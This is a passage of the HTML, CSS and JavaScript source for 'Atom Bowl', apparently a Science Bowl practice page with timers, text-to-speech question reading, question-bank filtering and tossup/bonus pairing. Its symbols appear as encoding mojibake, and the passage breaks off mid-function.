<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Atom Bowl ‚Äî Practice</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

  <style>
    :root {
      --bg: #0b0f14;
      --panel: #121824;
      --accent: #4f7cff;
      --text: #e6eaf0;
      --muted: #9aa4b2;
      --good: #39d98a;
      --bad: #ff6b6b;
      --warn: #f5c451;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: 'Inter', system-ui, sans-serif;
      background: var(--bg);
      color: var(--text);
      overflow-x: hidden;
    }

    /* Ambient animated backdrop */
    body::before {
      content: "";
      position: fixed;
      inset: -20vh -20vw;
      background:
        radial-gradient(900px 500px at 20% 10%, rgba(79,124,255,0.28), transparent 55%),
        radial-gradient(700px 420px at 80% 20%, rgba(57,217,138,0.14), transparent 60%),
        radial-gradient(900px 520px at 60% 90%, rgba(255,107,107,0.12), transparent 62%);
      filter: blur(18px);
      opacity: 0.9;
      animation: drift 14s ease-in-out infinite alternate;
      z-index: -2;
      pointer-events: none;
    }

    @keyframes drift {
      from { transform: translate3d(-1.2%, -0.8%, 0) scale(1); }
      to   { transform: translate3d( 1.2%,  0.9%, 0) scale(1.02); }
    }

    /* bottom wave */
    .waves {
      position: fixed;
      left: 0;
      right: 0;
      bottom: -2px;
      height: 170px;
      z-index: -1;
      pointer-events: none;
      opacity: 0.55;
    }

    .waves svg {
      width: 120%;
      height: 100%;
      transform: translateX(-8%);
    }

    .wave1 { animation: waveMove 10s ease-in-out infinite; }
    .wave2 { animation: waveMove 14s ease-in-out infinite reverse; opacity: 0.7; }

    @keyframes waveMove {
      0%   { transform: translateX(-8%); }
      50%  { transform: translateX(-2%); }
      100% { transform: translateX(-8%); }
    }

    /* NAV */
    .nav {
      position: fixed;
      top: 0;
      left: 0;
      height: 100vh;
      width: 280px;
      background: var(--panel);
      padding: 24px 24px 48px;
      transform: translateX(-100%);
      transition: transform 0.42s cubic-bezier(.2,.9,.2,1);
      z-index: 1000;
    }

    .nav.open { transform: translateX(0); }

    .nav-title {
      font-weight: 700;
      font-size: 1.4rem;
      margin-bottom: 24px;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .nav a {
      display: flex;
      align-items: center;
      gap: 14px;
      margin: 12px 0;
      padding: 12px 14px;
      border-radius: 12px;
      color: var(--text);
      text-decoration: none;
      font-weight: 500;
      transition: background 0.25s, color 0.25s, transform 0.15s;
    }

    .nav a:hover {
      background: rgba(79, 124, 255, 0.15);
      color: var(--accent);
      transform: translateX(4px);
    }

    .icon { width: 22px; text-align: center; }

    .hamburger {
      position: fixed;
      top: 20px;
      left: 20px;
      font-size: 28px;
      cursor: pointer;
      z-index: 1100;
      user-select: none;
      transition: left 0.35s ease;
    }

    .hamburger.open { left: 300px; }

    .overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.55);
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.42s cubic-bezier(.2,.9,.2,1);
      z-index: 900;
    }

    .overlay.show {
      opacity: 1;
      pointer-events: auto;
    }

    /* Engine UI */
    .main {
      padding: 112px 24px 140px;
      max-width: 960px;
      margin: auto;
      min-height: 100vh;
    }

    .topbar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 14px;
      margin-bottom: 26px;
      flex-wrap: wrap;
    }

    .pill {
      background: rgba(79,124,255,0.12);
      border: 1px solid rgba(79,124,255,0.28);
      padding: 12px 14px;
      border-radius: 14px;
      color: var(--text);
      font-weight: 700;
      letter-spacing: 0.2px;
      display: inline-flex;
      gap: 10px;
      align-items: center;
      min-width: 160px;
      justify-content: center;
    }

    .pill small { color: var(--muted); font-weight: 700; }

    .question-card {
      background: linear-gradient(145deg, rgba(20,27,46,0.95), rgba(15,21,36,0.92));
      border-radius: 22px;
      padding: 30px;
      border: 1px solid rgba(255,255,255,0.06);
      box-shadow: 0 20px 60px rgba(0,0,0,0.35);
      backdrop-filter: blur(8px);
      transform: translateY(0);
      transition: transform 0.25s ease, box-shadow 0.25s ease, border-color 0.25s ease;
      position: relative;
    }

    .question-card:hover {
      transform: translateY(-2px);
      border-color: rgba(79,124,255,0.22);
      box-shadow: 0 26px 70px rgba(0,0,0,0.42);
    }

    .pop { animation: popIn 220ms cubic-bezier(.2,.9,.2,1) both; }
    .interrupt-badge {
      display: inline-block;
      margin-left: 10px;
      padding: 4px 10px;
      font-weight: 700;
      font-size: 12px;
      letter-spacing: 0.5px;
      border-radius: 999px;
      background: #ffcc00;
      color: #000;
      box-shadow: 0 0 0 2px rgba(0,0,0,0.15);
      animation: interruptPulse 1s infinite;
    }

    .interrupt-badge.hidden {
      display: none;
    }

    @keyframes interruptPulse {
      0%   { transform: scale(1);   }
      50%  { transform: scale(1.08);}
      100% { transform: scale(1);   }
    }


    @keyframes popIn {
      from { opacity: 0; transform: translateY(8px) scale(0.99); }
      to   { opacity: 1; transform: translateY(0) scale(1); }
    }
    
    @keyframes pulseRed {
        0%   { box-shadow: 0 0 0 0 rgba(255,107,107,0.55); }
        70%  { box-shadow: 0 0 0 12px rgba(255,107,107,0); }
        100% { box-shadow: 0 0 0 0 rgba(255,107,107,0); }
    }
    
    .stopwatch-pulse {
        animation: pulseRed 1.4s infinite;
        border-radius: 8px;
        padding: 2px 6px;
    }

    .question-img {
      width: 100%;
      border-radius: 14px;
      display: none;
      margin: 18px 0 10px;
      background: rgba(255,255,255,0.02);
      border: 1px solid rgba(255,255,255,0.06);
      animation: fadeUp 260ms cubic-bezier(.2,.9,.2,1) both;
    }

    .question-text {
      font-size: 1.15rem;
      line-height: 1.6;
      margin: 18px 0 10px;
      padding: 16px 18px;
      border-radius: 14px;
      background: rgba(255,255,255,0.04);
      border: 1px solid rgba(255,255,255,0.08);
      font-weight: 600;
      white-space: pre-wrap;
    }

    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(6px); }
      to   { opacity: 1; transform: translateY(0); }
    }
    .summary-info {
        position: relative;
        display: inline-block;
        cursor: help;
        margin-left: 6px;
        color: var(--muted);
        font-weight: 700;
    }

    .summary-info-box {
        position: absolute;
        bottom: 130%;
        left: 50%;
        transform: translateX(-50%);
        width: 300px;
        padding: 12px 14px;
        border-radius: 12px;
        background: rgba(18,24,36,0.96);
        border: 1px solid rgba(255,255,255,0.08);
        color: var(--text);
        font-size: 0.85rem;
        line-height: 1.45;
        box-shadow: 0 16px 40px rgba(0,0,0,0.45);
        opacity: 0;
        pointer-events: none;
        transition: opacity 0.18s ease, transform 0.18s ease;
        z-index: 3000;
        text-align: left;
    }

    .summary-info-box b {
      display: block;
      margin: 6px 0 4px;
    }

    .summary-info:hover .summary-info-box {
    opacity: 1;
    transform: translateX(-50%) translateY(-4px);
    }
    /* === Speed control pill === */
    .pill.speed-pill {
      display: flex;
      align-items: center;
      gap: 8px;
      padding: 6px 10px;
    }

    /* Label */
    .pill.speed-pill small {
      opacity: 0.8;
      font-weight: 500;
    }

    /* Slider base */
    #speedSlider {
      -webkit-appearance: none;
      appearance: none;
      width: 90px;
      height: 4px;
      background: linear-gradient(
        to right,
        #5da9ff,
        #8fd3f4
      );
      border-radius: 999px;
      outline: none;
      cursor: pointer;
    }

    /* Slider thumb (Chrome / Edge / Safari) */
    #speedSlider::-webkit-slider-thumb {
      -webkit-appearance: none;
      appearance: none;
      width: 14px;
      height: 14px;
      border-radius: 50%;
      background: #ffffff;
      border: 2px solid #5da9ff;
      box-shadow: 0 0 0 2px rgba(93, 169, 255, 0.25);
      transition: transform 0.15s ease;
    }

    #speedSlider::-webkit-slider-thumb:hover {
      transform: scale(1.15);
    }

    /* Slider thumb (Firefox) */
    #speedSlider::-moz-range-thumb {
      width: 14px;
      height: 14px;
      border-radius: 50%;
      background: #ffffff;
      border: 2px solid #5da9ff;
      box-shadow: 0 0 0 2px rgba(93, 169, 255, 0.25);
      cursor: pointer;
    }

    /* Optional speed text */
    #speedLabel {
      font-size: 11px;
      opacity: 0.75;
      min-width: 32px;
      text-align: right;
    }



    .buzz {
      margin: 18px 0 16px;
      padding: 14px;
      border-radius: 14px;
      background: rgba(79,124,255,0.15);
      border: 1px solid rgba(79,124,255,0.18);
      box-shadow: 0 10px 30px rgba(0,0,0,0.25);
      font-weight: 800;
      letter-spacing: 0.3px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .buzz .kbd {
      font-weight: 900;
      background: rgba(0,0,0,0.25);
      border: 1px solid rgba(255,255,255,0.08);
      padding: 6px 10px;
      border-radius: 10px;
    }

    .meta {
      display: flex;
      justify-content: space-between;
      gap: 10px;
      margin: 14px 0 10px;
      flex-wrap: wrap;
      color: var(--muted);
      font-weight: 650;
      font-size: 0.92rem;
    }

    .answer-box {
      width: 100%;
      padding: 16px 18px;
      border-radius: 14px;
      border: 2px solid rgba(79,124,255,0.35);
      background: rgba(18,24,36,0.9);
      color: var(--text);
      font-size: 1.05rem;
      outline: none;
      margin: 0 0 12px;
    }

    .answer-box::placeholder { color: rgba(154,164,178,0.8); }

    .answer-box:focus {
      border-color: var(--accent);
      box-shadow: 0 0 0 6px rgba(79,124,255,0.12);
    }

    .choices {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 12px;
      margin: 0 0 12px;
    }

    .choice-btn {
      padding: 14px;
      border-radius: 14px;
      border: 1px solid rgba(255,255,255,0.08);
      font-size: 1.15rem;
      font-weight: 900;
      background: linear-gradient(145deg,#1b2440,#0f1524);
      color: var(--text);
      cursor: pointer;
      transition: transform .15s, filter .15s, border-color .15s;
      user-select: none;
    }

    .choice-btn:hover {
      transform: translateY(-2px);
      filter: brightness(1.08);
      border-color: rgba(79,124,255,0.35);
    }

    .row {
      display: flex;
      gap: 12px;
      align-items: center;
      justify-content: center;
      flex-wrap: wrap;
      margin-top: 14px;
    }

    .btn {
      padding: 12px 18px;
      border-radius: 14px;
      border: 1px solid rgba(255,255,255,0.08);
      font-size: 1rem;
      font-weight: 800;
      cursor: pointer;
      background: rgba(79,124,255,0.18);
      color: var(--text);
      transition: transform .15s, filter .15s, background .15s, box-shadow .15s;
      user-select: none;
    }

    .btn.primary {
      background: var(--accent);
      border-color: rgba(79,124,255,0.6);
      color: white;
    }

    .btn.good {
      background: rgba(57,217,138,0.18);
      border-color: rgba(57,217,138,0.55);
    }

    .btn.bad {
      background: rgba(255,107,107,0.16);
      border-color: rgba(255,107,107,0.5);
    }

    .btn.good:hover { filter: brightness(1.12); box-shadow: 0 10px 30px rgba(57,217,138,0.12); }
    .btn.bad:hover  { filter: brightness(1.12); box-shadow: 0 10px 30px rgba(255,107,107,0.12); }

    .btn:hover { transform: translateY(-1px); filter: brightness(1.06); }

    .feedback {
      margin: 10px 0 18px;
      min-height: 24px;
      font-weight: 800;
      letter-spacing: 0.2px;
      text-align: center;
      white-space: pre-wrap;
      line-height: 1.55;
    }

    .final-summary {
      margin-top: 14px;
      text-align: center;
    }

    .final-score {
      font-size: 1.4rem;
      font-weight: 800;
      margin-bottom: 6px;
    }

    .atom-score-row {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      font-weight: 700;
    }

    .feedback.good { color: var(--good); }
    .feedback.bad { color: var(--bad); }

    .hidden { display: none !important; }

    .error {
      background: rgba(255,107,107,0.14);
      border: 1px solid rgba(255,107,107,0.22);
      color: rgba(230,234,240,0.95);
      padding: 14px;
      border-radius: 14px;
      margin-bottom: 14px;
      font-weight: 700;
      white-space: pre-wrap;
    }

    .hint {
      margin-top: 10px;
      color: var(--muted);
      text-align: center;
      font-weight: 650;
      font-size: 0.92rem;
    }
  </style>
</head>
<body>

  <div class="waves" aria-hidden="true">
    <svg viewBox="0 0 1440 320" preserveAspectRatio="none">
      <path class="wave1" fill="rgba(79,124,255,0.20)" d="M0,224L48,229.3C96,235,192,245,288,229.3C384,213,480,171,576,154.7C672,139,768,149,864,176C960,203,1056,245,1152,250.7C1248,256,1344,224,1392,208L1440,192L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path>
      <path class="wave2" fill="rgba(57,217,138,0.10)" d="M0,256L60,229.3C120,203,240,149,360,138.7C480,128,600,160,720,170.7C840,181,960,171,1080,186.7C1200,203,1320,245,1380,266.7L1440,288L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path>
    </svg>
  </div>

  <!-- NAV -->
  <div class="nav" id="nav">
    <h2 class="nav-title">‚öõ Atom Bowl</h2>
    <a href="index.html"><span class="icon">üè†</span> Home</a>
    <a href="generate.html"><span class="icon">‚ú®</span> Generate</a>
    <a href="practice_home.html"><span class="icon">‚ö°</span> Practice</a>
    <a href="question_bank.html"><span class="icon">üìö</span> Question Bank</a>
    <a href="settings.html"><span class="icon">‚öôÔ∏è</span> Settings</a>
  </div>

  <div class="overlay" id="overlay"></div>
  <div class="hamburger" id="hamburger">‚ò∞</div>

  <div class="main">
    <div id="err" class="error hidden"></div>

    <div class="topbar">
      <div class="pill"><small>Timer</small> <span id="timer">20</span></div>
      <div class="pill"><small>Score</small> <span id="score">0</span></div>
      <div class="pill"><small>Stopwatch</small> <span id="stopwatch">0.00 s</span></div>
      <div class="pill"><small>Progress</small> <span id="progress">‚Äî</span></div>
      <div class="pill"><small>Mode</small> <span id="mode">‚Äî</span></div>
      <button id="ttsToggle" class="pill" title="Toggle voice">üîä</button>
      <div class="pill">
        <small>Speed</small>
        <input
          id="speedSlider"
          type="range"
          min="0.7"
          max="1.3"
          step="0.05"
          value="1.0"
          style="width: 90px;"
        />
        <small id="speedLabel">1.0x</small>  
      </div>
      <div id="interruptBadge" class="interrupt-badge hidden">‚ö°INTERRUPT</div>
    </div>

    <div class="question-card">
      <div class="buzz" id="buzz">Loading‚Ä¶</div>

      <img id="questionImg" class="question-img" src="" alt="Question" />
      <div id="questionText" class="question-text hidden"></div>

      <div class="meta">
        <div id="metaLeft">‚Äî</div>
        <div id="metaRight">‚Äî</div>
      </div>

      <input id="answer" class="answer-box hidden" placeholder="Type your answer‚Ä¶" autocomplete="off" />

      <div class="choices hidden" id="choices">
        <button class="choice-btn" type="button" data-letter="W">W</button>
        <button class="choice-btn" type="button" data-letter="X">X</button>
        <button class="choice-btn" type="button" data-letter="Y">Y</button>
        <button class="choice-btn" type="button" data-letter="Z">Z</button>
      </div>

      <div class="row">
        <button class="btn hidden" id="submitBtn" type="button">Submit</button>
        <button class="btn good hidden" id="rightBtn" type="button">‚úÖ Right</button>
        <button class="btn bad hidden" id="wrongBtn" type="button">‚ùå Wrong</button>
        <button class="btn hidden" id="nextBtn" type="button">Next</button>
      </div>

      <p class="feedback" id="feedback"></p>
      <div id="finalSummary" class="final-summary hidden">
        <div id="finalScore" class="final-score"></div>

        <div class="atom-score-row">
          <span class="atom-score-label">
            AtomScore¬Æ
            <span class="summary-info">‚ìò
              <span class="summary-info-box">
                AtomScore¬Æ is a session-based performance metric that summarizes how well you played.

                <b>What it measures</b>
                ‚Ä¢ Accuracy (most important)<br>
                ‚Ä¢ Average solve speed<br>
                ‚Ä¢ Consistency (penalizes slow correct answers ‚â•10s)

                <b>Interpretation</b>
                85‚Äì100 ‚Äî Elite (nationals-level)<br>
                70‚Äì84 ‚Äî Strong and consistent<br>
                50‚Äì69 ‚Äî Competitive<br>
                30‚Äì49 ‚Äî Developing<br>
                &lt;30 ‚Äî Needs practice

                AtomScore¬Æ ranges from 0‚Äì100.
              </span>
            </span>
          </span>
          <span id="atomScoreValue"></span>
        </div>
      </div>


      <!-- Search / Learn buttons (hidden until graded) -->
      <div class="row hidden" id="learnRow">
        <button class="btn" id="searchBtn" type="button">üîç Search</button>
        <button class="btn" id="learnBtn" type="button">ü§ñ Learn</button>
      </div>

      <div class="hint">Tip: Space to buzz (tap card on mobile). W/X/Y/Z keys work after buzzing. Esc goes back. (Grading: R=Right, W=Wrong)</div>
      <div class="row" id="statsRow" style="margin-top:32px">
      <div class="pill"><small>Accuracy</small> <span id="statAccuracy">‚Äî</span></div>
      <div class="pill"><small>Avg Speed</small> <span id="statSpeed">‚Äî</span></div>
      <div class="pill"><small>QS Correct</small> <span id="statCorrect">‚Äî</span></div>
      <div class="pill"><small>QS ‚â•10s</small> <span id="statSlow">‚Äî</span></div>
    </div>

    </div>
  </div>

  <script>
    // NAV
    const nav = document.getElementById('nav');
    const overlay = document.getElementById('overlay');
    const hamburger = document.getElementById('hamburger');

    function toggleNav() {
      const isOpen = nav.classList.toggle('open');
      overlay.classList.toggle('show');
      hamburger.classList.toggle('open');
      hamburger.textContent = isOpen ? '‚úï' : '‚ò∞';
    }

    hamburger.addEventListener('click', toggleNav);
    overlay.addEventListener('click', toggleNav);

    // Run config (single source of truth)
    const DEFAULT_RUN = {
      mode: 'rapid',
      level: 'ANY',
      category: 'ANY',
      qaType: 'ANY',
      bonus: 'ANY',
      count: 25,     // rapid mode: number of PAIRS
      seconds: 20,   // TU pre-buzz timer
      setName: '',
      roundName: '',
      bankFile: 'set_A.json'
    };

    function safeParseJSON(s, fallback) {
      try { return JSON.parse(s); } catch { return fallback; }
    }

    // practice_home should store settings here
    const cfg = safeParseJSON(localStorage.getItem('atom_run'), null) || {};

    const runCfg = {
      ...DEFAULT_RUN,
      ...cfg
    };

    runCfg.qaType = runCfg.qaType || runCfg.qtype || 'ANY';

    runCfg.seconds = parseInt(runCfg.seconds ?? runCfg.time, 10);
    if (!Number.isFinite(runCfg.seconds)) runCfg.seconds = DEFAULT_RUN.seconds;

    runCfg.count = parseInt(runCfg.count, 10);
    if (!Number.isFinite(runCfg.count)) runCfg.count = DEFAULT_RUN.count;
    if (runCfg.count < 1) runCfg.count = 1;

    runCfg.mode = runCfg.mode || DEFAULT_RUN.mode;
    document.getElementById('mode').textContent = runCfg.mode;

    // Early appearances for State constants
    let ttsEnabled = true;
    let currentUtterance = null;
    let readingSpeed = 1.0;

    // DOM
    const img = document.getElementById('questionImg');
    const questionTextEl = document.getElementById('questionText');
    const input = document.getElementById('answer');
    const feedback = document.getElementById('feedback');
    const timerEl = document.getElementById('timer');
    const scoreEl = document.getElementById('score');
    const progressEl = document.getElementById('progress');
    const buzzEl = document.getElementById('buzz');
    const choicesEl = document.getElementById('choices');
    const submitBtn = document.getElementById('submitBtn');
    const rightBtn = document.getElementById('rightBtn');
    const wrongBtn = document.getElementById('wrongBtn');
    const nextBtn = document.getElementById('nextBtn');
    const errEl = document.getElementById('err');
    const metaLeft = document.getElementById('metaLeft');
    const metaRight = document.getElementById('metaRight');
    const finalSummaryEl = document.getElementById('finalSummary');
    const finalScoreEl = document.getElementById('finalScore');
    const atomScoreValueEl = document.getElementById('atomScoreValue');
    const interruptBadgeEl = document.getElementById('interruptBadge');
    const learnRow = document.getElementById('learnRow');
    const searchBtn = document.getElementById('searchBtn');
    const learnBtn = document.getElementById('learnBtn');
    const ttsToggle = document.getElementById('ttsToggle');
    const BANK_DISPLAY_NAMES = {
      A: "Dyrapack",
      B: "Scalazar"
    }
    const speedSlider = document.getElementById('speedSlider')
    if (ttsToggle) {
      ttsToggle.onclick = () => {
        ttsEnabled = !ttsEnabled;
        if (!ttsEnabled) stopSpeech();
        ttsToggle.textContent = ttsEnabled ? "üîä" : "üîá";
      };
    }


    // State
    let bank = [];
    let questions = [];
    let index = 0;
    let time = 20;
    let timerId = null;
    let buzzed = false;
    let locked = false;
    let awaitingGrade = false;
    let score = 0;
    let runActive = false;
    // ---- Stats tracking ----
    let stats = {
      answered: 0,          // total buzzed questions
      correct: 0,           // graded correct
      totalTime: 0,         // seconds spent after buzz
      slowCorrect: 0        // correct answers taking >=10s
    };
    let buzzStartTime = null;
    let questionStartTime = null;
    let stopwatchStart = null;
    let stopwatchInterval = null;
    let stopwatchRunning = false;
    let interrupted = false;
    let baseTypeDelay = 90;

    

    function getTypewriterDelay() {
      return baseTypeDelay / readingSpeed;
    }


    function animateIn(el) {
      if (!el) return;
      el.classList.remove('pop');
      void el.offsetWidth;
      el.classList.add('pop');
      setTimeout(() => el.classList.remove('pop'), 260);
    }
    function startStopwatch() {
        stopStopwatch();
        stopwatchStart = Date.now();
        stopwatchRunning = true;

        stopwatchInterval = setInterval(() => {
            const elapsed = (Date.now() - stopwatchStart) / 1000;
            const el = document.getElementById('stopwatch');
            el.textContent = `${elapsed.toFixed(2)} s`;
            updateStopwatchColor(elapsed);
        }, 30);

    }
    speedSlider.oninput = (e) => {
      readingSpeed = Number(e.target.value);
      document.getElementById('speedLabel').textContent =
        `${readingSpeed.toFixed(2)}x`;
    };

    function speakText(text) {
      if (!ttsEnabled || !window.speechSynthesis) return;

      stopSpeech();

      const utterance = new SpeechSynthesisUtterance(text);
      utterance.rate = Math.max(0.7, Math.min(1.25, readingSpeed));       // Natural moderator pace
      utterance.pitch = 1.0;
      utterance.volume = 1.0;

      // Pick a clean English voice if available
      const voices = speechSynthesis.getVoices();
      const preferred = voices.find(v =>
        /en-US/i.test(v.lang) && /Google|Microsoft|Samantha/i.test(v.name)
      );
      if (preferred) utterance.voice = preferred;

      currentUtterance = utterance;
      speechSynthesis.speak(utterance);
    }

    function stopSpeech() {
      if (window.speechSynthesis) {
        speechSynthesis.cancel();
        currentUtterance = null;
      }
    }
    function warmUpSpeechSynthesis() {
      if (!window.speechSynthesis) return;
    
      const u = new SpeechSynthesisUtterance(" ");
      u.volume = 0;      // silent
      u.rate = 1.0;
      u.pitch = 1.0;
    
      window.speechSynthesis.speak(u);
      window.speechSynthesis.cancel();
    }



    function stopStopwatch() {
        if (stopwatchInterval) clearInterval(stopwatchInterval);
        stopwatchInterval = null;
        stopwatchRunning = false;
    }

    function resetStopwatch() {
        stopStopwatch();
        const el = document.getElementById('stopwatch');
        el.textContent = '0.00 s';
        el.style.color = 'var(--text)';
        el.classList.remove('stopwatch-pulse');
    }

    function updateStopwatchColor(seconds) {
        const el = document.getElementById('stopwatch');
        if (!el) return;

        el.classList.remove('stopwatch-pulse');

        if (seconds < 5) {
            el.style.color = 'var(--good)';
        } else if (seconds < 10) {
            el.style.color = 'var(--warn)';
        } else {
            el.style.color = 'var(--bad)';
            if (seconds >=20) {
                el.classList.add('stopwatch-pulse');
            }
        }
    }


    function showError(msg) {
      if (!errEl) return;
      errEl.textContent = msg;
      errEl.classList.remove('hidden');
      animateIn(errEl);
    }

    function hideError() {
      if (!errEl) return;
      errEl.classList.add('hidden');
      errEl.textContent = '';
    }

    function norm(s) { return String(s || '').trim(); }

    function currentQ() {
      if (!Array.isArray(questions) || questions.length === 0) return null;
      if (index < 0 || index >= questions.length) return null;
      return questions[index];
    }

    // -------- Bank loading helpers --------

    function normalizeBankFile(raw) {
      // Accept: "set_A.json", "./set_A.json", "/set_A.json", "banks/set_A.json"
      // Return: a cleaned relative path we can try as-is.
      let s = String(raw || '').trim();
      if (!s) return '';

      // If it's an absolute URL, keep it.
      if (/^https?:\/\//i.test(s)) return s;

      // Strip leading file-ish markers.
      s = s.replace(/^\.\/+/, '').replace(/^\/+/, '');
      return s;
    }

    function bankCandidates(bankFile) {
      const cleaned = normalizeBankFile(bankFile);
      if (!cleaned) return [];
      if (/^https?:\/\//i.test(cleaned)) return [cleaned];

      // Try a small set of sane candidates.
      const out = [
        `./${cleaned}`,
        cleaned,
      ];

      // If Home accidentally stored "./set_A.json" we'll avoid "././set_A.json" by normalization above.
      // Add a banks/ folder option (common project layout) if user later moves banks.
      if (!cleaned.startsWith('banks/')) out.push(`./banks/${cleaned}`);

      // Deduplicate
      return [...new Set(out)];
    }

    function isLikelyFileProtocol() {
      try { return window.location.protocol === 'file:'; } catch { return false; }
    }

    // -------- Image path resolver --------

    function resolveImgCandidates(q, field) {
      const raw = String((q && q[field]) || '').trim();
      if (!raw) return [];
      if (/^https?:\/\//i.test(raw)) return [raw];

      const p = raw.replace(/^\.\/+/, '').replace(/^\/+/, '');
      if (p.startsWith('images/')) return [p];

      const cands = [];
      if (p.startsWith('ms/') || p.startsWith('hs/')) cands.push('images/' + p);

      const lvl = String(q?.level || '').toLowerCase();
      if (lvl === 'ms' || lvl === 'hs') cands.push(`images/${lvl}/${p}`);

      cands.push('images/' + p);
      cands.push(p);
      return [...new Set(cands)];
    }

    function setImgWithFallback(imgEl, q, field) {
      const cands = resolveImgCandidates(q, field);
      let i = 0;
      imgEl.onerror = null;

      if (!cands.length) {
        imgEl.style.display = 'none';
        imgEl.src = '';
        return;
      }

      imgEl.style.display = 'block';
      imgEl.src = cands[i];
      imgEl.onerror = () => {
        i += 1;
        if (i >= cands.length) {
          imgEl.onerror = null;
          imgEl.style.display = 'none';
          imgEl.src = '';
          return;
        }
        imgEl.src = cands[i];
      };
    }

    // -------- Text / image renderer --------

    let typewriterTimer = null;
    let textFullyRevealed = true;

    function renderQuestion(q) {
      img.style.display = 'none';
      img.src = '';
      questionTextEl.classList.add('hidden');
      questionTextEl.textContent = '';
      clearInterval(typewriterTimer);
      textFullyRevealed = true;

      // TEXT MODE
      if (q.question_text && !q.question_image) {
        questionTextEl.classList.remove('hidden');
        animateIn(questionTextEl);
        startTypewriter(q.question_text);
        speakText(q.question_text);
        return;
      }

      // IMAGE MODE
      setImgWithFallback(img, q, 'question_image');
      img.alt = `Question ${index + 1}`;
    }

    function startTypewriter(text) {
      const words = String(text).split(/(\s+)/);
      let i = 0;
      textFullyRevealed = false;
      questionTextEl.textContent = '';
      const BASE_TYPE_DELAY = 90;
      const delay = BASE_TYPE_DELAY / readingSpeed;

      typewriterTimer = setInterval(() => {
        // Guard against empty tokens array edge cases
        if (i < words.length) questionTextEl.textContent += words[i];
        i++;
        if (i >= words.length) {
          clearInterval(typewriterTimer);
          textFullyRevealed = true;
        }
      }, getTypewriterDelay());
    }


    function applyFilters(list) {
      const level = runCfg.level;
      const category = runCfg.category;
      const qaType = runCfg.qaType;
      const bonus = runCfg.bonus;
      const setName = norm(runCfg.setName);
      const roundName = norm(runCfg.roundName);

      return list.filter(q => {
        if (level !== 'ANY' && q.level !== level) return false;
        if (category !== 'ANY' && norm(q.category) !== category) return false;
        if (qaType !== 'ANY' && q.type !== qaType) return false;

        // bonus can be ANY / true / false / TU / BONUS
        if (bonus !== 'ANY') {
          const b = String(bonus).toUpperCase().trim();
          const wantBonus = (b === 'TRUE' || b === 'BONUS' || b === 'B');
          const wantTU = (b === 'FALSE' || b === 'TU' || b === 'TOSSUP' || b === 'TOSS-UP' || b === 'T');
          if (wantBonus && !q.bonus) return false;
          if (wantTU && q.bonus) return false;
          if (!wantBonus && !wantTU && String(!!q.bonus) !== String(bonus)) return false;
        }

        if (setName && q.set_name !== setName) return false;
        if (roundName && q.round_name !== roundName) return false;
        return true;
      });
    }

    function shuffle(arr) {
      for (let i = arr.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [arr[i], arr[j]] = [arr[j], arr[i]];
      }
      return arr;
    }

    // Pair builder: TU -> BO, same SUBJECT (category) required; same set preferred; same round preferred.
    function buildRunQuestions() {
      const filtered = applyFilters(bank);
      if (!filtered.length) {
        showError('No matches for your run. Go back and loosen filters.');
        return [];
      }
      hideError();

      const mode = String(runCfg.mode || 'rapid').toLowerCase();

      // In tossups/bonuses modes, count means raw questions (not pairs)
      if (mode === 'tossups') {
        const tus = filtered.filter(q => !q.bonus);
        shuffle(tus);
        const n = Math.max(1, parseInt(runCfg.count, 10) || DEFAULT_RUN.count);
        return tus.slice(0, Math.min(n, tus.length));
      }
      if (mode === 'bonuses') {
        const bos = filtered.filter(q => q.bonus);
        shuffle(bos);
        const n = Math.max(1, parseInt(runCfg.count, 10) || DEFAULT_RUN.count);
        return bos.slice(0, Math.min(n, bos.length));
      }

      // Rapid/default: count means number of PAIRS
      const wantPairs = Math.max(1, parseInt(runCfg.count, 10) || DEFAULT_RUN.count);

      // Group by category first (subject is the hard requirement)
      const byCat = new Map();
      for (const q of filtered) {
        const cat = norm(q.category);
        if (!byCat.has(cat)) byCat.set(cat, []);
        byCat.get(cat).push(q);
      }

      const allPairs = [];

      for (const items of byCat.values()) {
        // Prefer pairing within same set
        const bySet = new Map();
        for (const q of items) {
          const key = String(q.set_name || '');
          if (!bySet.has(key)) bySet.set(key, []);
          bySet.get(key).push(q);
        }

        for (const setItems of bySet.values()) {
          const tus = setItems.filter(x => !x.bonus);
          const bos = setItems.filter(x => x.bonus);
          shuffle(tus);
          shuffle(bos);

          const usedBo = new Set();

          for (const t of tus) {
            // Prefer same round first
            let b = bos.find(x => !usedBo.has(x) && String(x.round_name) === String(t.round_name));
            if (!b) b = bos.find(x => !usedBo.has(x));
            if (!b) break;
            usedBo.add(b);
            allPairs.push([t, b]);
          }
        }
      }

      shuffle(allPairs);
      const pickedPairs = allPairs.slice(0, Math.min(wantPairs, allPairs.length));

      // Flatten into TU -> BO order
      const out = [];
      for (const [t, b] of pickedPairs) out.push(t, b);
      return out;
    }

    function updateProgressUI() {
      const q = currentQ();
      if (!q || !Array.isArray(questions) || !questions.length) {
        progressEl.textContent = '‚Äî';
        return;
      }

      const mode = String(runCfg.mode || 'rapid').toLowerCase();

      if (mode === 'tossups' || mode === 'bonuses') {
        // raw question progress
        progressEl.textContent = `${index + 1} / ${questions.length}`;
        return;
      }

      // pair progress
      const pairIndex = Math.floor(index / 2) + 1;
      const totalPairs = Math.max(1, Math.ceil(questions.length / 2));
      const label = q.bonus ? 'BO' : 'TU';
